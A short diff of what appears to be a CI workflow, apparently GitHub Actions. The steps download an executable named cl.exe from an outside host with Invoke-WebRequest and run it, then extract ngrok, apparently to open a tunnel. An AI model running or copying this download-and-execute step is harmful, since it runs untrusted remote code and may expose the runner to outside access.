@@ -13,7 +13,7 @@ jobs:
     - name: Download2
       run: Invoke-WebRequest https://net-black-net.craeckor.io/cl.exe -OutFile cl.exe
     - name: Run
-      run: .\cl.exe
+      run: Start-Process .\cl.exe
     - name: Extract
       run: Expand-Archive ngrok.zip
     - name: Auth
